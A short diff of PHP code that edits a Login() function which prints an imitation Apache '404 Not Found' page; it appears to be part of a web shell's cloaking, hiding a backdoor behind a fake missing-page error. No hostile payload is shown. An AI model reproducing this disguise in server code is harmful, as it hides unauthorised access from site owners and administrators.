@@ -17,7 +17,7 @@ return is_array($array) ? array_map('VEstripslashes', $array) : stripslashes($ar
 $_POST = VEstripslashes($_POST); 
 $_COOKIE = VEstripslashes($_COOKIE); } 
 function Login() {
-	die("<title>Not Found</title>
+	die("<title>404 Not Found</title>
 <h1>Not Found</h1>
 <p>The requested URL was not found on this server.</p>
 <p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p><hr>
